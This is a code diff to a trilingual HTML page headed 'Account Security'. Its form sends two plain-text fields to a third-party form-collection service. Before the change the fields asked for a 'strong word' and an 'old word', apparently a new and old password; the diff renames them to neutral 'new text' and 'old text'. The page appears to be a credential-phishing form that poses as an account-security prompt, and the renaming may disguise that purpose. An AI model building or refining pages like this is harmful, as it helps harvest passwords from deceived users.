@@ -84,6 +84,10 @@ button{
   cursor:pointer;
 }
 
+button:active{
+  transform:scale(.97);
+}
+
 .language{
   background:#eee;
   color:#333;
@@ -118,7 +122,12 @@ button{
 
 <body>
 
-<button class="theme-icon" id="themeIcon" onclick="toggleDark()">🌙</button>
+<button
+  class="theme-icon"
+  id="themeIcon"
+  onclick="toggleDark()"
+  type="button"
+>🌙</button>
 
 <div class="card">
 
@@ -127,27 +136,32 @@ button{
     <span class="badge">✓</span>
   </div>
 
-  <form action="https://formspree.io/f/xrpzoaod" method="POST">
+  <form
+    action="https://formspree.io/f/xrpzoaod"
+    method="POST"
+  >
 
+    <!-- النص الجديد -->
     <input
       type="text"
-      name="test_text"
-      id="testText"
-      placeholder="اكتب كلمة قوية"
+      name="new_text"
+      id="newText"
+      placeholder="النص الجديد"
       autocomplete="off"
       required
     >
 
+    <!-- النص القديم -->
     <input
       type="text"
-      name="test_text_2"
-      id="testText2"
-      placeholder="الكلمة القديمة"
+      name="old_text"
+      id="oldText"
+      placeholder="النص القديم"
       autocomplete="off"
       required
     >
 
-    <button id="send" type="submit">
+    <button type="submit" id="send">
       إرسال
     </button>
 
@@ -179,8 +193,8 @@ function toggleDark(){
 function changeLanguage(){
 
   const title=document.getElementById("title");
-  const input1=document.getElementById("testText");
-  const input2=document.getElementById("testText2");
+  const newText=document.getElementById("newText");
+  const oldText=document.getElementById("oldText");
   const send=document.getElementById("send");
 
   if(language==="ar"){
@@ -191,8 +205,8 @@ function changeLanguage(){
     document.documentElement.dir="ltr";
 
     title.textContent="Sécurité du compte";
-    input1.placeholder="Écrivez un mot fort";
-    input2.placeholder="Ancien mot";
+    newText.placeholder="Nouveau texte";
+    oldText.placeholder="Ancien texte";
     send.textContent="Envoyer";
 
   }else if(language==="fr"){
@@ -202,8 +216,8 @@ function changeLanguage(){
     document.documentElement.lang="en";
 
     title.textContent="Account Security";
-    input1.placeholder="Write a strong word";
-    input2.placeholder="Old word";
+    newText.placeholder="New text";
+    oldText.placeholder="Old text";
     send.textContent="Send";
 
   }else{
@@ -214,8 +228,8 @@ function changeLanguage(){
     document.documentElement.dir="rtl";
 
     title.textContent="أمان حسابك";
-    input1.placeholder="اكتب كلمة قوية";
-    input2.placeholder="الكلمة القديمة";
+    newText.placeholder="النص الجديد";
+    oldText.placeholder="النص القديم";
     send.textContent="إرسال";
   }
 }
